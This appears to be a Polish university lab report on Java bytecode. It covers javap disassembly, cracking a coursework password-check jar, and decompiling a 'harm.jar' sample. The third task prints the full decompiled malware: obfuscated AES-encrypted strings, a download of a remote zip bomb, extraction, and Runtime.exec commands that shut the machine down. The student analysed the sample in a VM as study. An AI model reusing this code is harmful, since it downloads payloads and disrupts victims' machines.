# APRO2 Lab5 Sprawozdanie

###### Tomasz Mycielski (304248)

## Zadanie 1

Na potrzeby zadania stworzyłem dwie klasy:
- `ConcatenatorPlusEquals`:
```java
package com.company.z1;

public class ConcatenatorPlusEquals {

    public static void main(String[] args) {
        String concatenation;
        concatenation = "String1" + "String2";
        System.out.println(concatenation);
    }
}
```
- `ConcatenatorStringBuilder`:
```java
package com.company.z1;

public class ConcatenatorStringBuilder {
    public static void main(String[] args) {
        StringBuilder stringBuilder;
        stringBuilder = new StringBuilder();
        stringBuilder.append("String1");
        stringBuilder.append("String2");
        String string;
        string = stringBuilder.toString();
        System.out.println(string);
    }
}
```

Wywołanie komendy `javap` na plikach `.class`, do których zostały skompilowane powyższe programy, wygenerowało następujący output:

- dla `ConcatenatorPlusEquals`:
```text
Compiled from "ConcatenatorPlusEquals.java"
public class com.company.z1.ConcatenatorPlusEquals {
  public com.company.z1.ConcatenatorPlusEquals();
  public static void main(java.lang.String[]);
}
```

- dla 'ConcatenatorStringBuilder':
```text
Compiled from "ConcatenatorStringBuilder.java"
public class com.company.z1.ConcatenatorStringBuilder {
  public com.company.z1.ConcatenatorStringBuilder();
  public static void main(java.lang.String[]);
}
```

Z powyższego wywnioskować można niewiele. Wiemy, że obydwa programy mają podobną strukturę — jest w nich tylko metoda `main(String[])`.

Program `javap` daje nam jednak do dyspozycji jeszcze opcję Disassemble the code, oznaczoną `-c`. Po wywołaniu komendy `javap -c` na tych samych plikach możemy dowiedzieć się o wiele więcej o programie:
- `ConcatenatorPlusEquals`
```text
Compiled from "ConcatenatorPlusEquals.java"
public class com.company.z1.ConcatenatorPlusEquals {
  public com.company.z1.ConcatenatorPlusEquals();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  public static void main(java.lang.String[]);
    Code:
       0: ldc           #7                  // String String1
       2: astore_1
       3: aload_1
       4: invokedynamic #9,  0              // InvokeDynamic #0:makeConcatWithConstants:(Ljava/lang/String;)Ljava/lang/String;
       9: astore_1
      10: getstatic     #13                 // Field java/lang/System.out:Ljava/io/PrintStream;
      13: aload_1
      14: invokevirtual #19                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
      17: return
}
```
- `ConcatenatorStringBuilder`
```text
Compiled from "ConcatenatorStringBuilder.java"
public class com.company.z1.ConcatenatorStringBuilder {
  public com.company.z1.ConcatenatorStringBuilder();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  public static void main(java.lang.String[]);
    Code:
       0: new           #7                  // class java/lang/StringBuilder
       3: dup
       4: invokespecial #9                  // Method java/lang/StringBuilder."<init>":()V
       7: astore_1
       8: aload_1
       9: ldc           #10                 // String String1
      11: invokevirtual #12                 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      14: pop
      15: aload_1
      16: ldc           #16                 // String String2
      18: invokevirtual #12                 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      21: pop
      22: aload_1
      23: invokevirtual #18                 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
      26: astore_2
      27: getstatic     #22                 // Field java/lang/System.out:Ljava/io/PrintStream;
      30: aload_2
      31: invokevirtual #28                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
      34: return
}
```
Otrzymaliśmy kod bajtowy Javy. Korzystając z jego dokumentacji dostępnej na [stronie](https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html) Oracle, możemy sporo dowiedzieć się o programie. Jednak już na pierwszy rzut oka widać, w której wersji programu wykorzystany został `StringBuilder`, a w której `+` do konkatenacji dwóch stringów. 

Moją szczególną uwagę zwrócił fakt, że w przypadku programu korzystającego ze `StringBuilder` możemy odczytać obydwa ciągi znaków, które ze sobą konkatenujemy, a w programie korzystającym z `+=` tylko drugi z nich.

Pliki `.class`, które podawałem do `javap` dostępne są w [lab5/out/production/lab5/com/company/z1/](./out/production/lab5/com/company/z1/).

## Zadanie 2

Do wykonania tego zadania wykorzystałem narzędzie [`Procyon`](https://github.com/ststeiger/procyon) na stronie [javadecompilers.com](javadecompilers.com). Po wysłaniu danego pliku na stronę dowiedziałem się, że program składa się z klas - `Coder` i `Main`:
- `Main.class`:
```java
package com.company;

import java.util.Date;
import java.time.Instant;
import java.text.SimpleDateFormat;

public class Main
{
    public static void main(final String[] array) {
        if (array.length != 1) {
            System.out.println("Wrong password!");
            return;
        }
        final String[] split = array[0].split("_");
        final int int1 = Integer.parseInt(new SimpleDateFormat("MM").format(Date.from(Instant.now())));
        if (split[0].length() == 7 && split[1].length() == 2) {
            if (split[0].equals(Coder.code("00PYe8m")) && Integer.parseInt(split[1]) == int1) {
                System.out.println("Good guess");
            }
            else {
                System.out.println("Wrong password!");
            }
        }
        else {
            System.out.println("Wrong password!");
        }
    }
}
```

- `Coder.class`:
```java
package com.company;

public class Coder
{
    static String code(final String s) {
        final StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); ++i) {
            sb.append((char)(s.charAt(i) + '\u0001'));
        }
        return sb.toString();
    }
}
```

Mając do dyspozycji powyższy kod, postarałem się odwzorować [program](lab5/src/com/company/z2) w swoim IDE. Po analizie kodu ustaliłem, że hasło ma strukturę `[7 znaków] podkreślnik [2 znaki]`. Siedem pierwszych znaków to output metody `Coder.code("00PYe8m")`, a dwa ostatnie znaki to numer obecnego miesiąca.

Sprawdzam [hasło](lab5/password.txt):
```text
$ java -jar ./Tomasz_Jerzy_Mycielski_task_2.jar 11QZf9n_04
Good guess
```

## Zadanie 3

Zdekompilowałem plik `harm.jar` dekompilatorem [`CFR`](https://github.com/leibnitz27/cfr).
<details>
<summary>Zdekompilowany kod</summary>

```java
/*
 * Decompiled with CFR 0.150.
 */
package com.company.z3.com.crack.it;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.Key;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Run {
private static String key = "Kjf456UjOP14Ywte";

    private static byte[] a(String string) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(string.length() / 2);
        for (int i = 0; i < string.length(); i += 2) {
            byteArrayOutputStream.write(Integer.parseInt(string.substring(i, i + 2), 16));
        }
        return byteArrayOutputStream.toByteArray();
    }

    private static String b(String string) throws Exception {
        byte[] arrby = Run.a(string);
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(key.getBytes(StandardCharsets.UTF_8));
        cipher.init(2, (Key)secretKeySpec, ivParameterSpec);
        byte[] arrby2 = cipher.doFinal(arrby);
        return new String(arrby2);
    }

    private static void c(String string) throws Exception {
        URL uRL = new URL(string);
        Path path = Paths.get(System.getProperty(Run.b("cf342300e78f3c21383678d00b71b225369f62782816ebd5986ae029b97f34f53fb78d0a05ece71c779ebbc83692cfe8919282626c7be128cfb6b8f285848ff5").trim()), new String[0]);
        Path path2 = Paths.get(path.toString(), Run.b("b92741a781f245538d5c75ab25330b9107832a09ef2c1d461a67507930557538e1fa2c3d572d2a384e4f9d399ef8c33d09467b3ab0454b41bab9350ce3774fdf").trim());
        try (BufferedInputStream bufferedInputStream = new BufferedInputStream(uRL.openStream());){
            int n;
            FileOutputStream fileOutputStream = new FileOutputStream(path2.toString());
            byte[] arrby = new byte[1024];
            while ((n = bufferedInputStream.read(arrby, 0, 1024)) != -1) {
                fileOutputStream.write(arrby, 0, n);
            }
        }
        catch (IOException iOException) {
            // empty catch block
        }
        Run.d(path2, path);
    }

    private static void d(Path path, Path path2) {
        try {
            if (!path.toFile().exists()) {
                return;
            }
            byte[] arrby = new byte[1024];
            ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(path.toString()));
            ZipEntry zipEntry = zipInputStream.getNextEntry();
            while (zipEntry != null) {
                int n;
                String string = Paths.get(path2.toString(), zipEntry.getName()).toString();
                FileOutputStream fileOutputStream = new FileOutputStream(string);
                while ((n = zipInputStream.read(arrby)) > 0) {
                    fileOutputStream.write(arrby, 0, n);
                }
                fileOutputStream.close();
                zipEntry = zipInputStream.getNextEntry();
            }
            zipInputStream.closeEntry();
            zipInputStream.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void main(String[] arrstring) throws Exception {
        String string = System.getProperty(Run.b("6474658359276b25720ff106097a2663f7d139752e9f95100ac045385fd51ee58f6a4a2c6d7f2701fed0ab2fff3a66bf43f78e79af22740fe718824cff7cda98").trim());
        String string2 = Run.b("054f1f395c9506dea62a842dd0a91602ef625bd2909bb87a2fbcab5a499e06013166de8c18bf9d982184785f07f59739c463c3d56327be198fcae6648f7314f4").trim();
        Run.c(Run.b("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9"));
        if (string.contains(string2)) {
            Runtime.getRuntime().exec(Run.b("2d830932f271350897857710196ec96453f8d261bc7f07181da0c2a10fbe2db2267c3526d61c01c1c28a004367774f64b687c76dcf6873995954a8d93f3d2f3c").trim());
        } else {
            Runtime.getRuntime().exec(Run.b("5673123e986e4c8ad4efa677a6d00b31b2007673a282e5ebc6a2738c0f603f36b372a9f85b2f598f3f76c5d43eb82e4183a123eea4031fcbb040c872e681e31f").trim());
        }
    }
}
```

</details>

Kod ten, po wprowadzeniu komentarzy (będących wynikiem analizy statycznej) wyjaśniających jego działanie, dostępny jest w katalogu [z3](lab5/src/com/company/z3/com/crack/it/).

Po dokonaniu drobnych zmian w kodzie i uruchomieniu go na maszynie wirtualnej (guest OS Ubuntu) dowiedziałem się, że:
- program sprawdza na jakim systemie jest uruchomiony (Windows lub Linux) w celu dostosowania komend, jakie będą na komputerze ofiary wykonywane
- program pobiera [zip bombę](https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip)
- program wypakowuje ją a następnie wyłącza komputer

Program może "zapchać" dysk ofiary po wypakowaniu zip bomby, jednak jest to mało prawdopodobne, gdyż po odpakowaniu bomba waży "jedynie" 5,5GB.

